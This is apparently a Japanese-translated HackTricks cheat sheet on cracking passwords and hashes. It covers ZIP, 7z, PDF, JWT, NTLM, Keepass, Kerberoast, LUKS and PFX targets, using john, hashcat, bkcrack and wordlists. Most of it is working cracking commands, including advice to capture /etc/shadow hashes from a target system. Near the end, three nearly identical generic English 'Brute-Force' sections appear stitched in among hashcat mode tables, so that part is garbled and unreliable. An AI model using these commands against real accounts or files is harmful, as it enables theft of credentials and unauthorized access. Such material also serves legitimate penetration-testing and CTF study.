* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

ハッシュをブルートフォースする前にこれをチェックしてください。

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### 既知の平文zip攻撃

暗号化されたzipファイルの中に含まれるファイルの**平文（または平文の一部）を知る必要があります。** 暗号化されたzipファイルに含まれるファイルの**ファイル名とサイズを確認するには、**`7z l encrypted.zip`\*\*を実行します。\
[**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

7zは、ファイルアーカイブと圧縮ユーティリティで、ブルートフォース攻撃の対象となることがあります。ブルートフォース攻撃では、すべての可能なパスワードの組み合わせが試されます。

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

PDFファイルは、一般的にパスワード保護されており、Brute Force攻撃を使用してアクセスできる可能性があります。Brute Force攻撃は、すべての可能なパスワードの組み合わせを試行し、正しいパスワードを見つける手法です。これにより、PDFファイルのパスワードを解読することができます。

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### PDFオーナーパスワード

PDFオーナーパスワードを解読するには、[こちら](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)を参照してください。

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

NTLMクラッキング

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

Keberoastingは、Active Directoryのユーザーアカウントに対する攻撃手法であり、攻撃者はKerberosサービスチケットを取得し、それをオフラインで解読することで、有効なユーザーアカウントのパスワードを取得します。 Keberoastingは、攻撃者がActive Directory環境内で特権昇格を行うための手段として使用されることがあります。

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Lucks image

#### 方法1

インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### 方法2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

別のLuks BFチュートリアル：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### PGP/GPGの秘密鍵

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)を使用し、その後johnを使用します

### Open Office Pwd Protected Column

xlsxファイルにパスワードで保護された列がある場合、それを解除できます：

* **Googleドライブにアップロード**してパスワードが自動的に削除されます
* **手動で**それを**削除**するには:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### PFX 証明書

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ツール

**ハッシュの例:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### ハッシュ識別子

```bash
hash-identifier
> <HASH>
```

### ワードリスト

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **ワードリスト生成ツール**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能なベース文字、キーマップ、およびルートを持つ高度なキーボードウォークジェネレータ。

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### Johnの変異

\_**/etc/john/john.conf**\_を読み、それを設定します

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat攻撃

* **ワードリスト攻撃** (`-a 0`) with rules

**Hashcat** にはすでに**ルールを含むフォルダ**が付属していますが、[**こちらで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

* **ワードリスト組み合わせ**攻撃

hashcatを使用して、2つのワードリストを1つに**組み合わせる**ことが可能です。\
リスト1に単語\*\*"hello"**が含まれ、2つ目には単語**"world"**と**"earth"\*\*がそれぞれ2行含まれている場合、`helloworld`と`helloearth`が生成されます。

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

* **マスク攻撃** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

* ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Hashcatモード

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

## Brute Forcing

Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. When it comes to cracking Linux hashes from the `/etc/shadow` file, brute forcing can be a powerful method if the passwords are not strong enough.

### Tools

There are various tools available for brute forcing passwords, such as John the Ripper, Hashcat, and Hydra. These tools can be used to automate the process of trying different password combinations against the hashed passwords in the `/etc/shadow` file.

### Methodology

1. **Capture Hashes**: Obtain the hashed passwords from the `/etc/shadow` file on the target Linux system.
2. **Select Tool**: Choose a suitable password cracking tool based on the type of hashes and the complexity of passwords.
3. **Configure Tool**: Set up the chosen tool to start the brute force attack. This may involve specifying the hash type, character set, and other parameters.
4. **Start Brute Forcing**: Initiate the brute force attack using the selected tool and wait for it to find the correct password.
5. **Password Cracked**: Once the tool successfully cracks the password, the plaintext password will be revealed.

By following this methodology and using the right tools, you can effectively crack Linux hashes from the `/etc/shadow` file through brute forcing.

```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

## Brute-Force

Brute-force attacks are a common way to crack passwords. They consist of trying all possible combinations of characters until the correct password is found. Brute-force attacks can be time-consuming but are often effective.

### Tools

There are several tools available for performing brute-force attacks, such as:

* **John the Ripper**: A popular password-cracking tool that can perform brute-force attacks.
* **Hashcat**: Another powerful tool for cracking passwords using brute-force techniques.
* **Hydra**: A versatile password-cracking tool that supports multiple protocols for brute-forcing.

### Methodologies

When performing a brute-force attack, it is essential to consider the following methodologies:

1. **Dictionary Attack**: In this method, a list of commonly used passwords or words from a dictionary is used to crack passwords.
2. **Mask Attack**: This method involves creating a mask that represents the password's possible characters and lengths.
3. **Hybrid Attack**: A combination of dictionary and brute-force attacks, where common passwords are tried first before moving on to brute-forcing.

### Resources

There are various online resources available for password cracking and brute-force attacks, including:

* **CrackStation**: An online password-cracking tool that supports various hash types.
* **Hashes.org**: A database of pre-computed password hashes that can be used for password cracking.
* **SecLists**: A collection of wordlists and password dictionaries for use in brute-force attacks.

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

## Brute-Force

Brute-force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute-forcing can be time-consuming and resource-intensive, but it is effective against weak passwords. There are tools available that can automate the brute-forcing process, such as John the Ripper and Hashcat.

### Brute-Forcing Tools

* **John the Ripper**: A popular password-cracking tool that can perform brute-force attacks on various types of hashes.
* **Hashcat**: Another powerful tool for cracking hashes using brute-force and other techniques.

### Brute-Forcing Strategies

* **Dictionary Attack**: Involves using a list of commonly used passwords to try and crack the hash.
* **Mask Attack**: Allows you to specify the format of the password, reducing the number of possible combinations to try.
* **Hybrid Attack**: Combines dictionary words with numbers and symbols to increase the chances of cracking the hash.

By using these brute-forcing strategies and tools, attackers can increase their chances of successfully cracking common application hashes.

```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* \*\*💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**する

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
